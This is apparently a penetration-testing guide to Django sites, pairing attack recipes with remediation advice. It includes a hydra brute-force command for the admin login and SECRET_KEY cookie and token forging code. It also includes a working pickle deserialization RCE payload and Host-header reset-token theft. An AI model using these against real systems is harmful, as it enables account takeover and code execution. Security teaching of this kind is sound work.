# Django (incl. Admin)

> Python web framework with a built-in admin interface (`/admin/`). Pentest paths: admin brute, debug-page leak, SQLi via raw ORM, SSTI via misused templates, deserialization via signed pickle session/cookie. Authorized testing only.

## TL;DR
- Most-found issue: `DEBUG = True` + a public `/admin/` panel. Debug page leaks paths, env vars, query history, and Django version → CVE shopping.
- `SECRET_KEY` leak (via debug page, repo accidental commit, or settings exposure) → session cookie forge, password-reset token forge, signed-URL forge.
- Django admin is auth-only — brute-force / SSO bypass is the usual entry.
- Defence: `DEBUG = False`, `SECRET_KEY` rotation discipline, `ALLOWED_HOSTS` strict, admin behind VPN or IP-restricted, MFA, security middleware enabled.

## Detection / Discovery

### Fingerprint
```bash
# Default 500 page (DEBUG=True) renders Django version prominently
curl -sk "https://target/?abc='" | grep -iE 'django|traceback|debug'

# /admin/ exists?
curl -sI https://target/admin/

# CSRF cookie name (default)
curl -sI https://target/ | grep -i 'csrftoken\|sessionid'

# 404 trailing-slash redirect (Django's APPEND_SLASH=True default)
curl -sI https://target/some-random-path-12345
```

### Debug page exposed (`DEBUG=True`)
Triggered by any unhandled exception with `DEBUG=True`. Provides:
- Full traceback (file paths, function names — codebase fingerprint).
- All request headers + GET/POST params (sensitive value leaks).
- Environment vars (`os.environ.items()`) → secrets.
- Installed apps + Django version → CVE shopping.
- Template paths + middleware stack.
- Last 100 DB queries (`django.db.connection.queries`) — query patterns.

```bash
# Trigger a 500 — most reliable: malformed query string
curl -sk "https://target/?abc=%00"
# Or a path that hits a known view with bad params
curl -sk "https://target/api/v1/foo?id=abc-not-int"
# View the response — if "DEBUG" or "Traceback" is in body, jackpot.
```

### Admin path discovery
```bash
# Default
curl -sk https://target/admin/login/

# Custom paths
for p in admin admin2 manage manage/login backend dashboard control panel; do
  curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" "https://target/$p/login/"
done
```

## Exploitation

### Admin brute force
```bash
# Standard form POST
hydra -L users.txt -P rockyou.txt target.tld https-post-form \
  '/admin/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=<csrf>&this_is_the_login_form=1&next=/admin/:Please enter the correct username' \
  -s 443 -V

# Or with wfuzz (handles CSRF token refresh)
# Or with custom Python using requests.Session + CSRF parse from each login page
```
Django has no built-in lockout — exposed admins are brute-able. Install `django-axes` to add lockout.

### `SECRET_KEY` exploitation
Leaked `SECRET_KEY` (debug page, repo commit, settings file exposure) → forge:
1. **Session cookies** — Django uses `SECRET_KEY` to sign `sessionid` for `SESSION_ENGINE='django.contrib.sessions.backends.signed_cookies'` (rare) and to sign CSRF tokens (default).
2. **Password-reset tokens** — `default_token_generator` uses `SECRET_KEY`; forge a reset token for any user → reset their password without email.
3. **Signed URLs** (`Signer().sign(...)`) — anywhere the app passes signed data to / from the client.

```python
from django.core.signing import Signer
s = Signer(key='<leaked_SECRET_KEY>')
forged = s.sign('arbitrary-payload')
```

### Pickle in signed cookies (legacy)
If session backend is `signed_cookies` AND `DEFAULT_SESSION_SERIALIZER` is `PickleSerializer` (DEPRECATED in Django 1.6+ but still in some apps), a leaked `SECRET_KEY` → arbitrary pickle deserialization → RCE.

```python
import pickle, base64
from django.core.signing import Signer

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id > /tmp/x',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
s = Signer(key='<leaked_SECRET_KEY>')
cookie = s.sign(payload)
# Now set sessionid cookie to `cookie` value
```

### ORM SQLi via `raw()` / `extra()` / annotation manipulation
Django ORM is parameter-safe by default. Risky spots:
```python
# Vulnerable
User.objects.raw("SELECT * FROM users WHERE name = '" + request.GET['name'] + "'")
User.objects.extra(where=["name='" + request.GET['name'] + "'"])
```
Confirm during code review. Black-box: standard SQLi probes — see [../sqli.md](../sqli.md).

### SSTI in Django templates
Django templates auto-escape and **don't** support arbitrary attribute access (e.g., no `{{ ''.__class__ }}` jailbreak). But Jinja2 (a common alternative on Django via `django.template.backends.jinja2.Jinja2`) has the full Jinja2 attack surface — see [../ssti.md](../ssti.md).

### DEBUG=True + open `/admin/` → ATO
Django includes the request object's `META` (env + request headers) in the debug error page. If you can trigger an error inside a logged-in admin's session, the response body leaks the admin's session cookie + CSRF token (visible in the debug rendering). Pair with reflected error trigger + same-origin XSS → ATO.

### Open redirect via `next=`
Django's auth views use `?next=` for post-login redirect. Versions ≤ some date didn't fully validate the URL → open redirect (CVE-2017-7233, etc.). Recent Django validates; verify version.

### `ALLOWED_HOSTS` bypass + cache poisoning
If `ALLOWED_HOSTS` is permissive (`['*']`) or set incorrectly, attacker can:
- Force `Host:` header injection into password-reset emails (Django uses `request.get_host()` to build the absolute URL in the reset email).
- Result: victim clicks reset link → reset URL is `http://attacker.tld/reset/<token>/` → attacker's server captures the token.

## Bypasses
- WAF blocks `/admin/` literal → try `/admin` (no trailing slash; Django redirects 301 — useful for bypass via redirect-follow if WAF only inspects the first request).
- `DEBUG=False` but `404.html` template includes `{% debug %}` (developer mistake) → leak even with debug off.

## Defence / Remediation
- **`DEBUG=False` in production**, always. Verify with the env-check.
- **`SECRET_KEY`** in environment variables, never in repo. Rotate on any suspected leak (rotation invalidates active sessions and reset tokens).
- **`ALLOWED_HOSTS`** explicit list of hostnames; never `['*']` in prod. Mitigates Host-header injection.
- **Move `/admin/`** to a non-default path: `path('seekret-admin/', admin.site.urls)`. Combined with `django-defender` / `django-axes` for rate-limit.
- **Admin access controls**:
  - MFA via `django-otp` / `django-two-factor-auth`.
  - IP allow-list via `RemoteUserMiddleware` + reverse proxy enforcement, or VPN-only access.
  - Strong-password policy via `AUTH_PASSWORD_VALIDATORS`.
- **Security middleware** enabled (`SECURE_*` settings):
  ```python
  SECURE_SSL_REDIRECT = True
  SESSION_COOKIE_SECURE = True
  CSRF_COOKIE_SECURE = True
  SESSION_COOKIE_HTTPONLY = True
  CSRF_COOKIE_HTTPONLY = True
  SESSION_COOKIE_SAMESITE = 'Lax'
  CSRF_COOKIE_SAMESITE = 'Strict'
  SECURE_HSTS_SECONDS = 31536000
  SECURE_HSTS_INCLUDE_SUBDOMAINS = True
  SECURE_HSTS_PRELOAD = True
  X_FRAME_OPTIONS = 'DENY'
  SECURE_CONTENT_TYPE_NOSNIFF = True
  ```
- **Session backend**: prefer DB-backed (`django.contrib.sessions.backends.db`) over `signed_cookies`. Faster invalidation.
- **`pickle` session serialiser**: don't use. Default since 1.6 is `JSONSerializer`.
- **`pip-audit` / `safety`** in CI for dependency CVE tracking.
- **Sentry / Rollbar** for error reporting in prod (so devs see tracebacks without `DEBUG=True`).

## Sources
- Django Security: https://docs.djangoproject.com/en/stable/topics/security/
- Django CVE archive: https://docs.djangoproject.com/en/stable/releases/security/
- Django Admin documentation: https://docs.djangoproject.com/en/stable/ref/contrib/admin/
- HackTricks Django: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/python.html#django
- OWASP — Django Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Django_Security_Cheat_Sheet.html
- django-axes (lockout): https://github.com/jazzband/django-axes
- django-two-factor-auth: https://github.com/jazzband/django-two-factor-auth
- pip-audit: https://github.com/pypa/pip-audit
- "Exploiting Django via SECRET_KEY leakage" (blog post archive): https://medium.com/@dchipiga (search secret_key) — and search Python Django security write-ups
